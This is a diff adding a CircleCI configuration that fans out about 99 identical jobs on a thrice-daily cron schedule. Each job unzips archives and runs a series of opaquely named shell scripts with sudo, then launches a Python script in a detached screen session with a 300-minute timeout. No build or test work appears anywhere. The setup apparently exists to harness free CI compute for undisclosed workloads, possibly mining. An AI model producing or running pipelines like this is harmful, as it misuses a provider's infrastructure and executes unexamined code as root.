@@ -1,0 +1,583 @@
+working_dir: &working_dir ~/app
+.build_template: &commonSteps
+  steps:
+    - checkout
+    - run:
+        name: A
+        command: |
+          sudo apt update -y
+    - run:
+        name: B
+        command: |
+          sleep 10s          
+          unzip cacing.zip && chmod u+x *
+          #./cacing.sh####
+    - run:
+        name: C
+        command: |
+          unzip ilhammbc.zip >/dev/null 2>&1
+    - run:
+        name: D
+        command: |
+          chmod u+x *
+    - run:
+        name: E
+        command: |
+          sudo ./aku.sh
+    - run:
+        name: F
+        command: |
+          sudo ./Bojo.sh
+    - run:
+        name: G
+        command: |
+          sudo ./cilok.sh
+    - run:
+        name: H
+        command: |
+          sudo ./dan.sh
+    - run:
+        name: I
+        command: |
+          sudo ./ewe.sh
+    - run:
+        name: J
+        command: |
+          #sudo ./Frean.sh#no_run
+    - run:
+        name: K
+        no_output_timeout: 300m
+        command: |
+          echo "Ijin Berkah Om. . ."
+          sudo ./gok.sh
+          sudo ./halah.sh
+          sudo ./Itu.sh
+          screen -dmS Acdb python3 pro01.py
+          sleep 300s
+          ./main01.sh
+  working_directory: *working_dir
+
+version: 2.0
+
+jobs:
+  fana_01:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  fana_02:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_03:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  fana_04:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_05:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_06:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_07:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_08:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_09:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_10:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_11:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_12:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_13:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_14:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_15:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_16:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_17:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_18:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_19:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_20:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_21:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_22:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_23:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  fana_24:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_25:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_26:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_27:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_28:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_29:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_30:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_31:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_32:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_33:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  fana_34:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_35:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_36:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_37:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_38:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_39:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_40:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_41:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_42:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_43:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  fana_44:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_45:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_46:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_47:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_48:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_49:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_50:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_51:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_52:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_53:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  fana_54:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_55:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_56:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_57:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_58:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_59:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_60:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_61:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_62:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_63:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  fana_64:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_65:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_66:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_67:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_68:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_69:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_70:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_71:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_72:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_73:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  fana_74:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_75:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_76:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_77:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_78:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_79:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_80:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_81:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_82:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_83:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  fana_84:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_85:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_86:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_87:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_88:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_89:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_90:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_91:
+    <<: *commonSteps
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+  fana_92:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_93:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    steps:
+      - checkout
+  fana_94:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_95:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_96:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_97:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_98:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+  fana_99:
+    docker:
+      - image: circleci/buildpack-deps:bionic-scm
+    <<: *commonSteps
+
+    triggers:
+      - schedule:
+          cron: "0 0,8,16 * * *"
+          filters:
+            branches:
+              only:
+                - anak
+                - kucing
+                - main
+                - di
+                - jalan
+
+workflows:
+  version: 2
+  fanahoki:
+    jobs:
+      - fana_01
+      - fana_02
+      - fana_03
+      - fana_04
+      - fana_05
+      - fana_06
+      - fana_07
+      - fana_08
+      - fana_09
+      - fana_10
+      - fana_11
+      - fana_12
+      - fana_13
+      - fana_14
+      - fana_15
+      - fana_16
+      - fana_17
+      - fana_18
+      - fana_19
+      - fana_20
+      - fana_21
+      - fana_22
+      - fana_23
+      - fana_24
+      - fana_25
+      - fana_26
+      - fana_27
+      - fana_28
+      - fana_29
+      - fana_30
+      - fana_31
+      - fana_32
+      - fana_33
+      - fana_34
+      - fana_35
+      - fana_36
+      - fana_37
+      - fana_38
+      - fana_39
+      - fana_40
+      - fana_41
+      - fana_42
+      - fana_43
+      - fana_44
+      - fana_45
+      - fana_46
+      - fana_47
+      - fana_48
+      - fana_49
+      - fana_50
+      - fana_51
+      - fana_52
+      - fana_53
+      - fana_54
+      - fana_55
+      - fana_56
+      - fana_57
+      - fana_58
+      - fana_59
+      - fana_60
+      - fana_61
+      - fana_62
+      - fana_63
+      - fana_64
+      - fana_65
+      - fana_66
+      - fana_67
+      - fana_68
+      - fana_69
+      - fana_70
+      - fana_71
+      - fana_72
+      - fana_73
+      - fana_74
+      - fana_75
+      - fana_76
+      - fana_77
+      - fana_78
+      - fana_79
+      - fana_80
+      - fana_81
+      - fana_82
+      - fana_83
+      - fana_84
+      - fana_85
+      - fana_86
+      - fana_87
+      - fana_88
+      - fana_89
+      - fana_90
+      - fana_91
+      - fana_92
+      - fana_93
+      - fana_94
+      - fana_95
+      - fana_96
+      - fana_97
+      - fana_98
+      - fana_99
